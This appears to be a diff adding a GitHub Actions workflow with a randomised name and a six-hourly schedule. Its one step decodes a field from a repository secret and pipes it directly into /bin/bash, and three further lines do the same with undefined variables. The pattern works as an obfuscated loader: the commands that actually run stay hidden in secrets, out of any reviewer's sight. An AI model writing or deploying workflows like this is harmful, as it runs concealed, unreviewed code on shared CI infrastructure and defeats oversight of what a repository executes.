@@ -1,0 +1,22 @@
+name: xuxiandangweishuganbu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuxiandangweishuganbu
+        env:
+          sw967: ${{ secrets.sw967 }}
+        run: |
+          echo $sw967 | jq -r .oma7 | /bin/bash
+          echo $ccu93 | jq -r .i03717 | /bin/bash
+          echo $hazy15 | jq -r .aybvf8 | /bin/bash
+          echo $t9702 | jq -r .de262 | /bin/bash
+
